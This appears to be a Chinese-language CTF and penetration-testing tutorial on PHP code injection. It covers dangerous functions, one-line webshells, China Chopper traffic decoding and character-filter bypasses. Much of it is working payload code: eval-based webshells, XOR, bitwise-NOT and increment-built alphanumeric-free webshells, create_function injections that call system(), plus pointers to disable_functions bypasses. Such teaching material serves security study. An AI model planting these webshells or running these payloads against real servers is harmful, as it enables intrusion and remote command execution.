# 代码注入漏洞

```php
/**
* Get the code from a GET input
* Example - http://example.com/?code=phpinfo();
*/
$code = $_GET['code'];

/**
* Unsafely evaluate the code
* Example - phpinfo();
*/
eval("\$code;");
```

在某些情况下，攻击者可以将代码注入升级为[命令注入](Web/command-injection.md)。

```url
http://example.com/?code=phpinfo();
```

## PHP WebShell

- 大马

代码量较大，通过编程语言的相关函数实现文件管理、数据库管理和系统命令执行等功能。可以通过 [Github 搜索](https://github.com/search?q=webshell+php&type=repositories) 获取 PHP 大马文件，但请注意辨别是否存在后门。

![PHP大马](../assets/images/webshell-screenshot.png)

- 小马

代码量小，通常只具备文件上传功能，用于下载大马。

- **一句话木马**

```php
<?php @eval($_POST['shell']);?>
```

仅仅**一行代码**，配合如[中国菜刀](https://github.com/raddyfiy/caidao-official-version)，[中国蚁剑 AntSword](https://github.com/AntSwordProject/antSword)、[哥斯拉 Godzilla](https://github.com/BeichenDream/Godzilla)、[冰蝎 Behinder](https://github.com/rebeyond/Behinder)、[Weevely](https://github.com/epinna/weevely3) 等 webshell 客户端工具使用。客户端通常具备文件管理、数据库管理和系统命令执行等功能。

!> 中国菜刀是国内首个 webshell 管理工具，由于作者已停止更新并关闭官网，网络上存在许多带有后门的版本，大家在下载安装时需谨慎甄别。

推荐使用中国蚁剑 AntSword。

![中国蚁剑](../assets/images/antsword.png)

## PHP 代码执行相关函数

| 名称                                           | 说明 |
| ---------------------------------------------- | ---- |
| eval()                                         |      |
| assert()                                       |      |
| preg_replace('/.\*/e',...)                     |      |
| create_function()                              |      |
| include()                                      |      |
| include_once()                                 |      |
| require()                                      |      |
| require_once()                                 |      |
| \$\_GET\['func_name'\](\$\_GET\['argument'\]); |      |

<!--
  // e does an eval() on the match
          // Create a function and use eval()

$func = new ReflectionFunction($_GET['func_name']);
$func->invoke();
// or
$func->invokeArgs(array());

// or serialize/unserialize function

array_map()：将用户自定义函数作用到数组中的每个值上，并返回带有新值的数组 -->

### [eval()](https://www.php.net/manual/zh/function.eval.php)

把字符串作为 PHP 代码执行，传入的必须是有效的 PHP 代码。所有的语句必须以**分号结尾**。

```php
<?php
eval('phpinfo();');
eval('?><?=`whoami`');
```

### [assert()](https://www.php.net/manual/zh/function.assert.php)

断言检测

?> 在 PHP 8.0.0 之前，如果 assertion 是 string，将解释为 PHP 代码，并通过 eval() 执行。这个字符串将作为第三个参数传递给回调函数。这种行为在 PHP 7.2.0 中弃用，并在 PHP 8.0.0 中移除。

```php
<?php
// assert() 直接将传入的参数作为PHP代码执行，不需要以分号结尾
assert('phpinfo()')
```

### [create_function()](https://www.php.net/manual/zh/function.create-function.php)

?> 已自 PHP 7.2.0 起被废弃，并自 PHP 8.0.0 起被移除

通过执行代码字符串创建动态函数，基本用法示例如下：

```php
<?php
/*
 * create_function(string $args, string $code)
 * 第一个参数：字符串类型，函数参数，多个参数用逗号分隔
 * 第二个参数：字符串类型，函数体
 * 返回值：以字符串形式返回唯一的函数名，失败时返回false
 */
$newfunc = create_function('$a,$b', 'return "ln($a) + ln($b) = " . log($a * $b);');
echo $newfunc(2, M_E) . PHP_EOL; // ln(2) + ln(2.718281828459) = 1.6931471805599

```

`create_function()`函数内部执行`eval()`，通过阅读[源码](https://github.com/php/php-src/blob/PHP-7.1.2/Zend/zend_builtin_functions.c#L2006)发现，存在字符串拼接问题，可通过构造闭合标签进行代码执行。

```php
<?php
create_function($_GET['args'], $_GET['code'])
```

上述代码的底层执行代码为

```php
eval('function  __lambda_func (' . $_GET['args'] .') {' . $_GET['code'] . '} \0')
```

若第一个参数可控，需闭合右圆括号和花括号，URL 为`?args=){}phpinfo();//`

```php
create_function('){}phpinfo();//', '')
function  __lambda_func (){}phpinfo();//){$_GET['code']}\0
```

若第二个参数可控，需闭合花括号，URL 为`?code=}phpinfo();//`

```php
create_function('','}phpinfo();//')
function  __lambda_func () {}phpinfo();//}\0
```

```url
http://example.com/?code=}phpinfo();//
```

例题：[Code-Breaking Puzzles](https://code-breaking.com/)的[easy-function](https://github.com/phith0n/code-breaking/tree/master/2018/function)

```php
<?php

/*
 * 空合并运算符（??）,是PHP7新增的语法糖，用于三元运算与isset()结合的情况
 * 如果第一个操作数存在且不为null，则返回它；否则返回第二个操作数
*/
$action = $_GET['action'] ?? '';
$arg = $_GET['arg'] ?? ''; // 等价于：$arg = isset($_GET['arg']) ? $_GET['arg'] : '';

/*
 * 正则表达式模式修饰符 i:忽略大小写 s:点号.元字符匹配所有字符，包含换行符 D:元字符美元符号$仅仅匹配目标字符串的末尾
 * 如果 $action 只有数字、字母、下划线组成，则显示源代码
 * 如果 $action 除了数字、字母、下划线之外，还有其他字符，则执行可变函数
 *  可变函数，第一个参数为空字符串，第二个参数可控，考虑create_function
 * 使用命名空间 \create_function
*/
if(preg_match('/^[a-z0-9_]*$/isD', $action)) {
    show_source(__FILE__);
} else {
    $action('', $arg); //
}
```

`$action`使用**命名空间**`\`绕过正则检测，`\create_function`;
`create_function()`函数的第二个参数可控。

```url
?action=\create_function&arg=}system($_GET['shell']);//
```

### [call_user_func()](https://www.php.net/manual/zh/function.call-user-func.php)

把第一个参数作为回调函数调用。基本用法示例如下：

```php
<?php
/*
 * call_user_func(callable $callback, mixed ...$args): mixed
 * 第一个参数：回调函数名称
 * 第二个参数：回调函数的参数，0个或以上的参数，被传入回调函数。
 */
function barber($type)
{
    echo "You wanted a $type haircut, no problem\n";
}
call_user_func('barber', "mushroom"); // 输出 You wanted a mushroom haircut, no problem
call_user_func('barber', "shave"); // 输出 You wanted a shave haircut, no problem
```

如果传入的参数可控，可造成代码执行。

```php
call_user_func('system', 'whoami');
```

### [call_user_func_array()](https://www.php.net/manual/zh/function.call-user-func-array.php)

调用回调函数，并把一个数组参数作为回调函数的参数。基本用法示例如下：

```php
<?php
/*
 * call_user_func_array(callable $callback, array $args): mixed
 * 第一个参数：回调函数名称
 * 第二个参数：回调函数参数，数组形式
 * 返回值：返回回调函数的结果。如果出错的话就返回 false
 */
function foobar($arg, $arg2) {
    // 魔术常量，__FUNCTION__ 当前函数的名称
    echo __FUNCTION__, " got $arg and $arg2\n";
}

// Call the foobar() function with 2 arguments
call_user_func_array("foobar", array("one", "two")); // foobar got one and two
```

如果传入的参数可控，可造成代码执行。

```php
<?php
call_user_func_array($_GET['arg1'],$_GET['arg2'])
// ?arg1=system&arg2[]=whoami
// call_user_func_array('system', ['whoami']);
```

### [preg_replace()](https://www.php.net/manual/zh/function.preg-replace.php)

执行一个正则表达式的搜索和替换，如果设置模式修饰符`e`，则`$replacement`作为代码执行。

?> 模式修饰符`e`，已自 PHP 5.5 起被废弃，并自 PHP 7.0 起被移除

```php
<?php
/*
 * preg_replace(
    string|array $pattern, // 要搜索的模式。可以是一个字符串或字符串数组。
    string|array $replacement, // 用于替换的字符串或字符串数组
    string|array $subject, // 要进行搜索和替换的字符串或字符串数组。
    int $limit = -1, // 每个模式在每个 subject 上进行替换的最大次数。默认是 -1(无限)。
    int &$count = null // 如果指定，将会被填充为完成的替换次数。
): string|array|null
 */
$replacement = 'phpinfo()';
preg_replace("/123/e", $replacement, "1234567");
```

### [array_map()](https://www.php.net/manual/zh/function.array-map.php)

为数组的每个元素应用回调函数，基本用法示例：

```php
<?php
/*
 * array_map(?callable $callback, array $array, array ...$arrays): array
 *
 */
function cube($n)
{
    return ($n * $n * $n);
}

$a = [1, 2, 3, 4, 5];
$b = array_map('cube', $a);
print_r($b);
```

### [array_filter()](https://www.php.net/manual/zh/function.array-filter.php)

使用回调函数过滤数组的元素

### [array_walk()](https://www.php.net/manual/zh/function.array-walk.php)

### [ob_start()](https://www.php.net/manual/zh/function.ob-start.php)

打开输出控制缓冲

### [usort()](https://www.php.net/manual/zh/function.usort.php)

使用用户自定义的比较函数对数组中的值进行排序

PHP 5.6 新特性，[支持使用 ... 运算符进行参数展开](https://www.php.net/manual/zh/migration56.new-features.php#migration56.new-features.splat)

```php
// ?1[]=1&1[]=phpinfo()
usort($_GET[1],'assert');

// PHP >= 5.6
// ?1[]=1&1[]=eval($_POST['shell']);&2=assert
usort(...$_GET);
```

### 中国菜刀的流量分析

查看目录下文件

原始 HTTP POST 请求字段:

```text
shell=array_map("ass"."ert",array("ev"."Al(\"\\\$xx%3D\\\"Ba"."SE6"."4_dEc"."OdE\\\";@ev"."al(\\\$xx('QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtpZihQSFBfVkVSU0lPTjwnNS4zLjAnKXtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO307ZWNobygiWEBZIik7JEQ9Jy9zcnYvJzskRj1Ab3BlbmRpcigkRCk7aWYoJEY9PU5VTEwpe2VjaG8oIkVSUk9SOi8vIFBhdGggTm90IEZvdW5kIE9yIE5vIFBlcm1pc3Npb24hIik7fWVsc2V7JE09TlVMTDskTD1OVUxMO3doaWxlKCROPUByZWFkZGlyKCRGKSl7JFA9JEQuJy8nLiROOyRUPUBkYXRlKCJZLW0tZCBIOmk6cyIsQGZpbGVtdGltZSgkUCkpO0AkRT1zdWJzdHIoYmFzZV9jb252ZXJ0KEBmaWxlcGVybXMoJFApLDEwLDgpLC00KTskUj0iXHQiLiRULiJcdCIuQGZpbGVzaXplKCRQKS4iXHQiLiRFLiJcbiI7aWYoQGlzX2RpcigkUCkpJE0uPSROLiIvIi4kUjtlbHNlICRMLj0kTi4kUjt9ZWNobyAkTS4kTDtAY2xvc2VkaXIoJEYpO307ZWNobygiWEBZIik7ZGllKCk7'));\");"));
```

字符串拼接后的中重要代码：

```php
$xx="BaSE64_dEcOdE";
@eval($xx('QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtpZihQSFBfVkVSU0lPTjwnNS4zLjAnKXtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO307ZWNobygiWEBZIik7JEQ9Jy9zcnYvJzskRj1Ab3BlbmRpcigkRCk7aWYoJEY9PU5VTEwpe2VjaG8oIkVSUk9SOi8vIFBhdGggTm90IEZvdW5kIE9yIE5vIFBlcm1pc3Npb24hIik7fWVsc2V7JE09TlVMTDskTD1OVUxMO3doaWxlKCROPUByZWFkZGlyKCRGKSl7JFA9JEQuJy8nLiROOyRUPUBkYXRlKCJZLW0tZCBIOmk6cyIsQGZpbGVtdGltZSgkUCkpO0AkRT1zdWJzdHIoYmFzZV9jb252ZXJ0KEBmaWxlcGVybXMoJFApLDEwLDgpLC00KTskUj0iXHQiLiRULiJcdCIuQGZpbGVzaXplKCRQKS4iXHQiLiRFLiJcbiI7aWYoQGlzX2RpcigkUCkpJE0uPSROLiIvIi4kUjtlbHNlICRMLj0kTi4kUjt9ZWNobyAkTS4kTDtAY2xvc2VkaXIoJEYpO307ZWNobygiWEBZIik7ZGllKCk7'));
```

base64 解码核心 PHP 代码：

```php
<?php
@ini_set("display_errors", "0");
@set_time_limit(0);
if (PHP_VERSION < '5.3.0') {
    @set_magic_quotes_runtime(0);
};
echo ("X@Y");
$D = '/srv/';
$F = @opendir($D);
if ($F == NULL) {
    echo ("ERROR:// Path Not Found Or No Permission!");
} else {
    $M = NULL;
    $L = NULL;
    while ($N = @readdir($F)) {
        $P = $D . '/' . $N;
        $T = @date("Y-m-d H:i:s", @filemtime($P));
        @$E = substr(base_convert(@fileperms($P), 10, 8), -4);
        $R = "\t" . $T . "\t" . @filesize($P) . "\t" . $E . "\n";
        if (@is_dir($P))
            $M .= $N . "/" . $R;
        else
            $L .= $N . $R;
    }
    echo $M . $L;
    @closedir($F);
};
echo ("X@Y");
die();
```

## 无字母数字

```php
<?php
if (!preg_match('/[a-z0-9]/is', $_GET['code'])) {
    eval($_GET['code']);
}
```

将非字母、数字的字符经过各种变换，构造出字母、数字，进而得到函数名，结合 PHP 动态函数的特点，达到执行代码的目的。

PHP 7 引入了抽象语法树（AST），与 PHP 5 在[关于间接使用变量、属性和方法的变化](https://www.php.net/manual/zh/migration70.incompatible.php)。特别说明的是，PHP 7 支持`'phpinfo'()`、`('phpinfo')()`。

`$_GET[_]` 8 个字符

### 按位异或 XOR`^`

[PHP位运算符](https://www.php.net/manual/zh/language.operators.bitwise.php)中的`按位异或`，如`$a ^ $b`，当两个操作对象**都是字符串**时，将对会组成字符串的字符 ASCII 值执行操作，结果也是一个字符串。按位异或的规则是`相同为0，不同为1`。

```php
<?php
echo 0^0; // 0
echo 0^1; // 1
echo 1^1; // 0
echo 1^0; // 1

echo urlencode('a'^'a'); // %00
echo urlencode('a'^'b'); // %03
```

我们可以通过

```php
<?php
$myfile = fopen("xor_rce.txt", "w");
$contents = "";
for ($i = 0; $i < 256; $i++) {
 for ($j = 0; $j < 256; $j++) {

  if ($i < 16) {
   $hex_i = '0'.dechex($i);
  } else {
   $hex_i = dechex($i);
  }
  if ($j < 16) {
   $hex_j = '0'.dechex($j);
  } else {
   $hex_j = dechex($j);
  }
  $preg = '/[a-z0-9]/i'; //根据题目给的正则表达式修改即可
  if (preg_match($preg, hex2bin($hex_i)) || preg_match($preg, hex2bin($hex_j))) {
   echo "";
  } else {
   $a = '%'.$hex_i;
   $b = '%'.$hex_j;
   $c = (urldecode($a)^urldecode($b));
   if (ord($c) >= 32&ord($c) <= 126) {
    $contents = $contents.$c." ".$a." ".$b."\n";
   }
  }
 }
}
fwrite($myfile, $contents);
fclose($myfile);
```

简易 payload 如下：

```php
$_="`{{{"^"?<>/"; // $_ = '_GET';
${$_}[_](${$_}[__]); // $_GET[_]($_GET[__]);

$_="`{{{"^"?<>/";${$_}[_](${$_}[__]); // $_ = '_GET'; $_GET[_]($_GET[__]);
```

### 按位取反 Not`~`

[PHP位运算符](https://www.php.net/manual/zh/language.operators.bitwise.php)中的`按位取反`，如`~ $a`，将$a 中为 0 的位设为 1，反之亦然。如果操作对象是字符串，则将对组成字符串的字符 ASCII 值进行取反操作，结果将会是字符串。

通过调用代码执行函数，如`assert`，获得`webshell`，代码如下：

```php
<?php
/*
 * echo urlencode(~'assert'); // %9E%8C%8C%9A%8D%8B
 * echo urlencode(~'_POST');  // %A0%AF%B0%AC%AB
 */

// assert($_POST[_]);
// 支持PHP5和PHP7
$_=~'%9E%8C%8C%9A%8D%8B';$__=~'%A0%AF%B0%AC%AB';$__=$$__;$_($__[_]);

// $_=~'%A0%AF%B0%AC%AB';$_=$$_;(~'%9E%8C%8C%9A%8D%8B')($_[_]);
```

### 自增

PHP 支持[PERL字符串递增功能](https://www.php.net/manual/zh/language.operators.increment.php)，该字符串必须是字母数字 ASCII 字符串。当到达字母 Z 且递增到下个字母时，将进位到左侧值。例如，$a = 'Z'; $a++;将 $a 变为 'AA'。

!> 自 PHP 8.3.0 起，此功能已软弃用。应该使用 str_increment() 函数。

```php
// ASSERT($_POST[_]);
// 由于payload中存在加号+，使用时需要进行URL编码
$_=[].'';$_=$_['!'=='@'];$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$____='_';$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;$___($_[_]);
```

### 过滤美元符号`$`

```php
<?php
if (!preg_match('/[a-z0-9$]/i', $_GET['code'])) {
    eval($_GET['code']);
}
```

过滤掉`$`，将无法构造变量。

在 PHP7 下，可以利用`('phpinfo')()`语法，生成执行单个命令的 payload。

```php
<?php
$func = 'system';
$cmd = 'whoami';

// system('whoami');
// PHP 7!
echo '(~' . urlencode(~$func) . ')(~' . urlencode(~$cmd) . ');'; // (~%8C%86%8C%8B%9A%92)(~%88%97%90%9E%92%96);
```

```php
?><?=`. /???/????????[@-[]`;?>
```

### 过滤下划线`_`

### 过滤分号`;`

<https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html>

## 无参数

```php
<?php
highlight_file(__FILE__);

// (?R) 递归语法
if(';' === preg_replace('/[^\W]+\((?R)?\)/', '', $_GET['code'])) {    
    eval($_GET['code']);
}
```

`';' === preg_replace('/[^\s\(\)]+?\((?R)?\)/', '', $code)`

正则表达式`[^\W]+\((?R)\)`匹配无参数的函数，如`a()`、`a(b())`等。

- <https://xz.aliyun.com/t/10780>

## `disable_function`绕过

PHP 配置文件`php.ini`中的[disable_function](https://www.php.net/manual/zh/ini.core.php#ini.disable-functions)指令，用于禁止某些函数。接受逗号分隔的函数名列表作为参数。仅能禁用内置函数。不能影响用户自定义函数。

```
disable_functions = pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail,system

open_basedir=.:/proc/:/tmp/
```

### 寻找黑名单之外的未被禁用的函数

### 环境变量`LD_PRELOAD`

`LD_PRELOAD`是 Linux 系统中的一个环境变量，它允许用户在程序运行前定义优先加载的动态链接库（\*.so）。
前提条件

- Linux 系统

- [putenv()](https://www.php.net/manual/zh/function.putenv.php)函数可用
- mail error_log
- 存在可写目录，需上传.so 文件

<https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD>

### shellshock（CVE-2014-6271）

### Apache Mod CGI

### PHP-FPM 利用 LD_PRELOAD 环境变量(同 1)

### 攻击 PHP-FPM 监听端口

### Json Serializer UAF

### PHP7 GC with Certain Destructors UAF

### PHP7.4 FFI 扩展执行命令

### 利用 iconv 扩展执行命令

### 参考资料

- <https://www.freebuf.com/articles/network/263540.html>
- <https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions>

## `open_basedir`绕过

## 参考资料

<!--
```
<?=`$_GET[1]`;
<? `$_GET[1]`;

<?php
highlight(__FILE__);

$code = $_GET['code'];
if(strlen($code)<=1) {
 eval("?>".$code)
}
```

从代码执行到命令执行
<https://r0yanx.com/2021/07/18/%E8%AE%B0%E4%B8%80%E9%81%93%E9%99%90%E5%88%B6%E9%95%BF%E5%BA%A6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84CTF%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B/>

代码执行`eval()`参数限制在 16 个字符

```php
<?php
$param = $_REQUEST['param'];
if((strlen($param) < 17)) {
 eval($param);
}
eval('`$_GET[_]`;');
eval('exec($_GET[_]);');

eval('?><?=`$_GET[_]`;');
include$_GET[1];
include$_GET[1];&1=php://filter/read/convert.base64-decode/resource=N

usort(...$_GET);
1[]=test&1[]=phpinfo();&2=assert
```

<https://www.leavesongs.com/SHARE/some-tricks-from-my-secret-group.html>
最短的传参`$_GET[_]`，长度 8 位；9

<?=`$_GET[_]` 13位

```php
?><?=`$_GET[_]`； 16位

echo `$_GET[_]`； 16 位
exec($_GET[_]); //15 无回显
eval($_GET[_]); // 15
5+10=15
exec 10
system()

```

-->